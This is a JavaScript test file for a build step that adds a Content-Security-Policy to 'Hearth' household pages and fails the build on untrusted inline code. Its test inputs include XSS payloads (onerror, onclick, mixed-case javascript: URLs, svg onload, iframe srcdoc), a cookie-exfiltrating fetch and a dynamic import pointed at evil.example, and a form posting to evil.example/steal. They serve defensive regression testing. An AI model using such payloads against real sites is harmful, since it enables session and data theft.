// hearth-csp.test.mjs — the Hearth page's security policy: what it allows, who it trusts, where it sits, and that it governs ONLY the Hearth (POS-959).
//
// Darko (2026-11-01 15:54 EST) ruled "inline scripts forbidden by the page's security policy"; Wright (2026-11-09 00:38) ruled the shape: a
// Hearth-scoped meta policy in the repo, hashes for the TRUSTED HOST's scripts, the page's only policy, no edge or global one.
//
// THE AUTHORITY IS NOT THE ENTRY'S CONTENT. The permitted hashes come from the page with the ENTRY'S REGION taken out (Hearth.astro marks
// everything an entry contributes between <!--hearth-entry--> and <!--/hearth-entry-->, exactly once); the page's inline scripts, entry
// included, are only checked against them, and code the trusted host does not carry gets no authority and FAILS THE BUILD. The
// BUILD-INPUT tests below hold that: they hand the policy writer pages with entry-controlled executable code in them and require the
// build to stop, instead of hashing it. (qa-shots/hearth-walk.mjs proves the effective policy in a real browser.)
//
// POS-984 (Darko, 2026-11-09 14:34 EST): the Hearth IS the household page now, at households/<slug>/index.html. Until 2026-11-09 this file held
// a SEPARATE entry-free household page as the reference, and the policy governed households/<slug>/hearth/index.html; the same page, minus
// the region, is the reference now, and the forwarder at hearth/ carries no policy.

import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createHash } from "node:crypto";
import {
  inlineScripts, hearthPolicy, withHearthPolicy, trustedHashes, applyHearthPolicy, hearthPages, inlineExecutableMarkup, withoutEntryRegion,
  ENTRY_OPEN, ENTRY_CLOSE, PANES_ORIGIN, HearthPolicyError,
} from "../tools/lib/hearth-csp.mjs";
import { prepareEntry } from "../src/lib/hearth/entries.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const DIST = path.join(ROOT, "dist-town");
const built = fs.existsSync(path.join(DIST, "households"));
const sha = (t) => "sha256-" + createHash("sha256").update(t, "utf8").digest("base64");

const HOST_SCRIPTS = ["var host = 1;", "window.pmBell = true;"];
const HOST_MODULE = 'import "./host.js";';
// the household page as Hearth.astro builds it: the host's scripts outside, and everything an entry contributes (its stylesheet and its stage) between the two markers
const hearthPage = (stage = "<p>entry</p>", extraHead = "") => `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>hearth</title>${extraHead}<script>${HOST_SCRIPTS[0]}</script><script type="module">${HOST_MODULE}</script><script src="/_astro/hearth.js" type="module"></script><script type="application/json" data-hearth-entries>[{"html":"<script>x</script>"}]</script></head><body><script>${HOST_SCRIPTS[1]}</script><section data-hearth>${ENTRY_OPEN}<style data-hearth-css>.a{}</style><div class="hearth-stage" data-hearth-stage>${stage}</div>${ENTRY_CLOSE}</section></body></html>`;
const TRUSTED = trustedHashes(hearthPage());

// ── what a script is, and the policy text ──────────────────────────────────

test("inlineScripts: the inline scripts a page would execute, hashed from their exact text; external scripts and data blocks are not", () => {
  const s = inlineScripts(`<head><script>var a = 1;</script><script type="module">import "./x.js";</script><script src="/_astro/a.js" type="module"></script>` +
    `<script type="application/json" data-x>{"a":"</s"}</script><script type="application/ld+json">{}</script><script type="text/javascript">window.b=2</script></head>`);
  assert.deepEqual(s.map((x) => x.text), ["var a = 1;", 'import "./x.js";', "window.b=2"]);
  assert.equal(s[0].hash, sha("var a = 1;"));
  assert.deepEqual(inlineScripts("<p>none</p><script src=x></script>"), []);
});

test("the policy: scripts are 'self' and hashes only: no inline, eval, hashes-of-attributes, data:, blob:, https: or wildcard for script", () => {
  const p = hearthPolicy([sha("b"), sha("a"), sha("a")]);
  const script = /(?:^|; )script-src ([^;]*)/.exec(p)[1].split(" ");
  assert.equal(script[0], "'self'");
  assert.deepEqual(script.slice(1), [`'${sha("a")}'`, `'${sha("b")}'`].sort(), "each distinct hash once, sorted");
  for (const t of script) assert.ok(t === "'self'" || /^'sha256-[A-Za-z0-9+/]+={0,2}'$/.test(t), `an unexpected script source: ${t}`);
  assert.ok(!/unsafe-inline|unsafe-eval|unsafe-hashes|strict-dynamic|nonce-/.test(script.join(" ")));
  const dirs = Object.fromEntries(p.split("; ").map((d) => [d.split(" ")[0], d.split(" ").slice(1).join(" ")]));
  assert.equal(dirs["default-src"], "'self'");
  assert.equal(dirs["object-src"], "'none'");
  // POS-984: the household page carries each resident's sandboxed window (an iframe on the isolated panes origin, its tab fetches that origin's windows.json)
  // and the profile editor's avatar preview (a blob: image). Until 2026-11-09 this asserted frame-src 'none', connect-src "'self' https://postmark.town" and img-src without blob:.
  assert.equal(PANES_ORIGIN, "https://panes.postmark.town");
  assert.equal(dirs["frame-src"], PANES_ORIGIN, "the only frames are the isolated panes origin's: a template cannot embed anything else");
  assert.equal(dirs["base-uri"], "'self'");
  assert.equal(dirs["form-action"], "'self'");
  assert.equal(dirs["connect-src"], `'self' https://postmark.town ${PANES_ORIGIN}`, "the page may reach its own origin, the office's API and the panes' window list, and nothing else");
  assert.equal(dirs["img-src"], "'self' data: blob: https:");
  assert.ok(!/\*/.test(p) && !/["<>]/.test(p));
});

// ── the trusted host: positive authority, independent of the page ─────────

test("trustedHashes: the page's inline scripts OUTSIDE the entry's region, and never one inside it; no page, no authority", () => {
  assert.deepEqual([...TRUSTED].sort(), [sha(HOST_SCRIPTS[0]), sha(HOST_MODULE), sha(HOST_SCRIPTS[1])].sort());
  const carrying = trustedHashes(hearthPage(`<p>x</p><script>window.__entry = 1</script>`));
  assert.ok(!carrying.has(sha("window.__entry = 1")), "a script an entry carries is never the host's");
  assert.deepEqual([...carrying].sort(), [...TRUSTED].sort());
  assert.throws(() => trustedHashes(""), HearthPolicyError);
  assert.throws(() => trustedHashes(undefined), /no page to take the trusted host's scripts from/);
});

test("withoutEntryRegion: the region is marked exactly once, in order; anything else cannot say what the entry is, so it stops the build", () => {
  const page = hearthPage("<p>mine</p>");
  const out = withoutEntryRegion(page);
  assert.ok(!out.includes("<p>mine</p>") && !out.includes("hearth-stage") && !out.includes(ENTRY_OPEN) && !out.includes(ENTRY_CLOSE), "the whole region goes, markers included");
  assert.ok(out.includes("<section data-hearth></section>") && out.includes(`<script>${HOST_SCRIPTS[1]}</script>`), "and nothing else does");
  assert.throws(() => withoutEntryRegion("<p>no markers</p>"), /found 0 opening and 0 closing/);
  assert.throws(() => withoutEntryRegion(hearthPage(`${ENTRY_OPEN}`)), /found 2 opening and 1 closing/, "an entry that writes the opening marker doubles it");
  assert.throws(() => withoutEntryRegion(hearthPage(`${ENTRY_CLOSE}<script>alert(1)</script>${ENTRY_OPEN}`)), /found 2 opening and 2 closing/, "an entry that writes both cannot end its region early");
  assert.throws(() => withoutEntryRegion(`<p>${ENTRY_CLOSE}</p><p>${ENTRY_OPEN}</p>`), /closes before it opens/);
  assert.throws(() => trustedHashes(hearthPage(`${ENTRY_CLOSE}<script>alert(1)</script>${ENTRY_OPEN}`)), HearthPolicyError, "so an entry cannot move a script out of its region by faking the end of it");
});

test("withHearthPolicy: the host's own inline scripts get the policy; the meta sits right after the charset, before any script", () => {
  const out = withHearthPolicy(hearthPage(), TRUSTED);
  const meta = /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/.exec(out);
  assert.ok(meta && out.indexOf(meta[0]) < out.search(/<script\b/), "before the first script");
  assert.ok(out.startsWith('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv='));
  for (const t of [HOST_SCRIPTS[0], HOST_MODULE, HOST_SCRIPTS[1]]) assert.ok(meta[1].includes(`'${sha(t)}'`));
  assert.equal(out.replace(meta[0], ""), hearthPage(), "nothing else in the page changed");
  assert.equal((out.match(/Content-Security-Policy/g) ?? []).length, 1);
});

// ── BUILD-INPUT REGRESSIONS: code that is not the host's gets no authority, and the build stops ──

test("BUILD INPUT: an executable inline script inside the entry's stage is NOT hashed: the build fails", () => {
  const page = hearthPage(`<p>x</p><script>window.__pwned = "entry"</script>`);
  assert.throws(() => withHearthPolicy(page, TRUSTED), (e) => e instanceof HearthPolicyError && /1 inline executable script\(s\) the trusted host does not/.test(e.message) && !e.message.includes("__pwned"));
});

test("BUILD INPUT: an executable inline script OUTSIDE the stage, in the head or after it, is not hashed either (location is not trust)", () => {
  assert.throws(() => withHearthPolicy(hearthPage("<p>x</p>", `<script>fetch("https://evil.example/" + document.cookie)</script>`), TRUSTED), HearthPolicyError);
  assert.throws(() => withHearthPolicy(hearthPage("<p>x</p>").replace("</body>", `<script type="module">import("https://evil.example/x.js")</script></body>`), TRUSTED), HearthPolicyError);
  // a script that LOOKS like a marker the host uses is still unknown code
  assert.throws(() => withHearthPolicy(hearthPage("<p>x</p>").replace("</body>", `<script data-astro-trusted data-hearth-host>alert(1)</script></body>`), TRUSTED), HearthPolicyError);
  assert.throws(() => withHearthPolicy(hearthPage(`</div><script>alert(1)</script><div>`), TRUSTED), HearthPolicyError, "closing the stage early does not move it into the host");
});

test("BUILD INPUT: an inline event handler or a javascript: URL in the page stops the build, however it is spelled", () => {
  for (const stage of [`<img src=x onerror="alert(1)">`, `<p onclick=alert(1)>x</p>`, `<a href="javascript:alert(1)">x</a>`, `<a href=" JaVa\tScRiPt:alert(1)">x</a>`, `<form action="javascript:alert(1)"></form>`]) {
    assert.throws(() => withHearthPolicy(hearthPage(stage), TRUSTED), (e) => e instanceof HearthPolicyError && /inline event handler|javascript: URL/.test(e.message), stage);
  }
  assert.deepEqual(inlineExecutableMarkup(hearthPage("<p>plain, with <a href=\"/x\">a link</a></p>")), { handlers: 0, jsUrls: 0 });
  assert.deepEqual(inlineExecutableMarkup(`<script>var s = "<p onclick=x>"</script><style>a[onclick]{}</style><p>ok</p>`), { handlers: 0, jsUrls: 0 }, "script and style bodies are not markup");
});

test("BUILD INPUT: a script with the host's EXACT text is the host's code (same bytes, same authority); one changed byte is not", () => {
  assert.doesNotThrow(() => withHearthPolicy(hearthPage(`<script>${HOST_SCRIPTS[0]}</script>`), TRUSTED));
  assert.throws(() => withHearthPolicy(hearthPage(`<script>${HOST_SCRIPTS[0]} </script>`), TRUSTED), HearthPolicyError);
  assert.throws(() => withHearthPolicy(hearthPage(`<script>${HOST_SCRIPTS[0]};alert(1)</script>`), TRUSTED), HearthPolicyError);
});

test("BUILD INPUT: without the trusted host's hashes there is no policy to write", () => {
  assert.throws(() => withHearthPolicy(hearthPage()), /needs the trusted host's script hashes/);
  assert.throws(() => withHearthPolicy(hearthPage(), new Set()), HearthPolicyError, "an empty trusted set trusts nothing, so the host's own scripts fail too");
  assert.throws(() => withHearthPolicy(withHearthPolicy(hearthPage(), TRUSTED), TRUSTED), /already carries a security policy/);
  assert.throws(() => withHearthPolicy("<p>no head</p>", TRUSTED), /no <head>/);
});

test("BUILD INPUT, through the real sanitizer: a hostile entry's markup reaches the page with NO executable code, and a script appended past it still stops the build", () => {
  const e = prepareEntry({
    id: "hostile", title: "h", html: `<p onclick="x()">a</p><script>window.__pwned=1</script><img src=x onerror=alert(1)><a href="javascript:alert(1)">b</a><svg onload=alert(1)></svg><iframe srcdoc="<script>alert(1)</script>"></iframe>`, css: "",
  });
  assert.ok(e.ok);
  const page = hearthPage(e.html);
  assert.deepEqual(inlineScripts(page).map((s) => s.hash).sort(), [...TRUSTED].sort(), "only the host's scripts are on the page");
  assert.doesNotThrow(() => withHearthPolicy(page, TRUSTED), "what the sanitizer wrote is accepted: it carries no code");
  assert.throws(() => withHearthPolicy(hearthPage(e.html + "<script>alert(1)</script>"), TRUSTED), HearthPolicyError, "if code got past the sanitizer, the build still stops");
});

// ── applyHearthPolicy on a scratch build output ────────────────────────────

const io = {
  readFile: (p) => fs.readFileSync(p, "utf8"),
  writeFile: (p, t) => fs.writeFileSync(p, t),
  listDir: (p) => fs.readdirSync(p).filter((n) => fs.statSync(path.join(p, n)).isDirectory()),
  exists: fs.existsSync,
  join: path.join,
};
const FORWARDER = `<!doctype html><html><head><meta charset="utf-8"><script>location.replace("/x/" + location.search)</script></head><body>forwarding</body></html>`;
const slashes = (list) => list.map((p) => p.split(path.sep).join("/"));
function scratchBuild(houses) {
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "pos959-csp-"));
  const put = (rel, text) => { fs.mkdirSync(path.dirname(path.join(dest, rel)), { recursive: true }); fs.writeFileSync(path.join(dest, rel), text); };
  put("index.html", "<html><head></head><body>front</body></html>");
  put("residents/wick/index.html", hearthPage());   // a page with the same scripts that is not a household page: it is never touched
  for (const [slug, h] of Object.entries(houses)) {
    put(`households/${slug}/index.html`, h.page ?? hearthPage());
    put(`households/${slug}/hearth/index.html`, FORWARDER);
  }
  return { dest, read: (rel) => fs.readFileSync(path.join(dest, rel), "utf8") };
}

test("applyHearthPolicy: each household page is checked against ITS OWN host scripts, written, and nothing else is touched (the forwarder and the resident pages included)", () => {
  const b = scratchBuild({ a: {}, b: {} });
  const before = b.read("households/a/hearth/index.html") + b.read("index.html") + b.read("residents/wick/index.html");
  // the pages come back joined with io.join (path.join): "/" on Linux, "\" on Windows (POS-1002), so they are compared with "/" (slashes)
  assert.deepEqual(slashes(applyHearthPolicy(b.dest, io)).sort(), ["households/a/index.html", "households/b/index.html"]);
  assert.match(b.read("households/a/index.html"), /Content-Security-Policy/);
  assert.match(b.read("households/b/index.html"), /Content-Security-Policy/);
  assert.equal(b.read("households/a/hearth/index.html") + b.read("index.html") + b.read("residents/wick/index.html"), before, "the forwarder, the front door and the resident pages are untouched");
});

test("applyHearthPolicy: a household page carrying code outside the host's, or no marked region at all, STOPS the build and writes nothing for it", () => {
  const bad = scratchBuild({ a: { page: hearthPage(`<script>alert(1)</script>`) } });
  const was = bad.read("households/a/index.html");
  assert.throws(() => applyHearthPolicy(bad.dest, io), HearthPolicyError);
  assert.equal(bad.read("households/a/index.html"), was, "not written");
  assert.throws(() => applyHearthPolicy(scratchBuild({ a: { page: "<!doctype html><html><head><meta charset=\"utf-8\"></head><body>no region</body></html>" } }).dest, io), /entry region must be marked exactly once/);
  assert.throws(() => applyHearthPolicy(scratchBuild({ a: { page: hearthPage(`${ENTRY_CLOSE}<script>alert(1)</script>${ENTRY_OPEN}`) } }).dest, io), /entry region must be marked exactly once/, "an entry that fakes the end of its region stops the build");
});

test("hearthPages: only households/<slug>/index.html; the forwarder at hearth/ is not one", () => {
  const tree = { households: ["a", "b", "c"], "households/a/index.html": 1, "households/a/hearth/index.html": 1, "households/b/hearth/index.html": 1, "households/c/index.html": 1 };
  assert.deepEqual(hearthPages((d) => tree[d] ?? [], (...p) => p.join("/"), (p) => p in tree), ["households/a/index.html", "households/c/index.html"]);
});

test("the integration is wired, fails the build on a refusal, and touches only the Hearth pages", () => {
  const cfg = fs.readFileSync(path.join(ROOT, "astro.config.town.mjs"), "utf8");
  assert.match(cfg, /import hearthCsp from '\.\/town\/scripts\/hearth-csp\.mjs'/);
  assert.match(cfg, /integrations: \[worldEngineIsland\(\), hearthCsp\(\)\]/);
  const src = fs.readFileSync(path.join(ROOT, "town/scripts/hearth-csp.mjs"), "utf8");
  assert.match(src, /applyHearthPolicy\(dest,/);
  assert.ok(!/try\s*\{|catch\s*\(/.test(src), "a refusal is not swallowed: it fails the build");
});

// ── the built site (skipped without a build, like the funding tests: run `npm run build` first) ──

function everyPage(dir, out = []) {
  for (const n of fs.readdirSync(dir)) {
    const p = path.join(dir, n);
    if (fs.statSync(p).isDirectory()) everyPage(p, out); else if (n.endsWith(".html")) out.push(p);
  }
  return out;
}

test("built: every household page carries exactly one policy, before its scripts, allows only inline scripts its own host (outside the entry's region) runs, and carries none inside the region", { skip: !built }, () => {
  const slugs = fs.readdirSync(path.join(DIST, "households")).filter((s) => fs.existsSync(path.join(DIST, "households", s, "index.html")));
  assert.ok(slugs.length > 10, "there are household pages in the build");
  for (const slug of slugs) {
    const p = path.join(DIST, "households", slug, "index.html");
    const html = fs.readFileSync(p, "utf8");
    const metas = [...html.matchAll(/<meta http-equiv="Content-Security-Policy" content="([^"]*)">/g)];
    assert.equal(metas.length, 1, `${slug}: one policy`);
    assert.ok(html.indexOf(metas[0][0]) < html.search(/<script\b/), `${slug}: policy before the first script`);
    const scripts = /script-src ([^;]*)/.exec(metas[0][1])[1];
    assert.ok(!/unsafe-inline|unsafe-eval/.test(scripts), `${slug}: no inline allowance for script`);
    const host = trustedHashes(html);
    const region = html.slice(html.indexOf(ENTRY_OPEN), html.indexOf(ENTRY_CLOSE));
    assert.ok(region.includes("hearth-stage"), `${slug}: the region holds the design's stage`);
    assert.deepEqual(inlineScripts(region), [], `${slug}: nothing an entry contributes is executable`);
    const allowed = [...scripts.matchAll(/'(sha256-[^']+)'/g)].map((m) => m[1]);
    assert.ok(allowed.length > 0);
    for (const h of allowed) assert.ok(host.has(h), `${slug}: ${h} is allowed but the page's host does not run it`);
    for (const s of inlineScripts(html)) assert.ok(allowed.includes(s.hash), `${slug}: an inline script has no allowance`);
    assert.deepEqual(inlineExecutableMarkup(html), { handlers: 0, jsUrls: 0 }, `${slug}: no inline handler or javascript: URL`);
  }
});

test("built: NO other page carries a policy: the forwarder beside each household page, the resident pages and every other route are untouched", { skip: !built }, () => {
  const households = fs.readdirSync(path.join(DIST, "households")).filter((s) => fs.existsSync(path.join(DIST, "households", s, "index.html")));
  const governed = new Set(households.map((s) => `households/${s}/index.html`));
  // compared with "/" whatever the OS joins with (POS-1002: on Windows path.join gives "\")
  const rel = (p) => path.relative(DIST, p).split(path.sep).join("/");
  const others = everyPage(DIST).filter((p) => !governed.has(rel(p)));
  assert.ok(others.length > 1000, "the rest of the site is in the build");
  assert.ok(others.some((p) => /^households\/[^/]+\/hearth\/index\.html$/.test(rel(p))), "the forwarders are among the pages checked");
  const withPolicy = others.filter((p) => /http-equiv="?Content-Security-Policy/i.test(fs.readFileSync(p, "utf8"))).map(rel);
  assert.deepEqual(withPolicy, []);
});

// ── the household page hosts no stake form any more (POS-984, rebuilt 2026-11-10) ──
// Until then the site's band hosted POS-502's ballot stake form, and the policy had to be shown to fit it (a bundled 'self' script, a runtime <style>, a
// fetch to the office). The band is gone and the form is /votes/'s alone (Darko, 17:14–17:28 EST: the theme is the page), so the policy governs a page with
// no form on it, and an entry shaped like the form is still only stripped or namespaced.

test("BUILD INPUT: an entry's markup shaped like a stake form is stripped or namespaced: it cannot place a form or take the form's classes", () => {
  const e = prepareEntry({
    id: "mimic", title: "m", author: "x", line: "l",
    html: `<section data-hb-stake="hearth-contest" class="hb-stake bs"><form action="https://evil.example/steal"><input name="stamps"><button class="bs-confirm">Confirm stake</button></form><p>a</p></section>`,
    css: `.bs { color: red } .bs-confirm, .hb-stake { display: none }`,
  });
  assert.ok(e.ok);
  assert.ok(!/<form|<input|<button|data-hb-|evil\.example|action=/i.test(e.html), `no form, no input, no stake hook: ${e.html}`);
  assert.ok(!/class="[^"]*(^|[\s"])(bs|bs-confirm|hb-stake)\b/.test(e.html.replace(/u-(bs|bs-confirm|hb-stake)/g, "")), "its classes are namespaced `u-`, so the form's rules (.bs …) never meet them");
  assert.ok(!/(^|[^-\w])\.(bs|bs-confirm|hb-stake)\b/.test(e.css.replace(/\.u-(bs|bs-confirm|hb-stake)/g, "")), "and its stylesheet cannot name the form's classes");
});

test("built: no household page carries any stake or ballot code: none inline, none in the entry's region, and its own bundled script is not the stake form's", { skip: !built }, () => {
  const slugs = fs.readdirSync(path.join(DIST, "households")).filter((s) => fs.existsSync(path.join(DIST, "households", s, "index.html")));
  assert.ok(slugs.length > 10);
  const bundled = new Set();
  for (const slug of slugs) {
    const html = fs.readFileSync(path.join(DIST, "households", slug, "index.html"), "utf8");
    for (const s of inlineScripts(html)) assert.ok(!/stake-vote|pm:ballot-staked|BALLOT_STAKE|mountBallotStake|data-hband-ballots/.test(s.text), `${slug}: an inline script carries the stake code`);
    const region = html.slice(html.indexOf(ENTRY_OPEN), html.indexOf(ENTRY_CLOSE));
    assert.ok(!/stake-vote|ballot-staked|bs-form|data-hband-ballots/.test(region), `${slug}: nothing of the stake form is in the entry's region`);
    for (const m of html.matchAll(/<script[^>]*\ssrc="(\/_astro\/[^"]+\.js)"/g)) bundled.add(m[1]);
  }
  assert.ok(bundled.size >= 1, "the household page's own scripts are bundled files under /_astro/ (script-src 'self')");
  const stage = [...bundled].filter((f) => fs.readFileSync(path.join(DIST, f), "utf8").includes("data-hearth-stage"));
  assert.ok(stage.length >= 1, "and one of them is the stage's");
  for (const f of stage) assert.ok(!fs.readFileSync(path.join(DIST, f), "utf8").includes("pm:ballot-staked"), `${f}: the stage carries no stake event: the stake form is /votes/'s`);
});
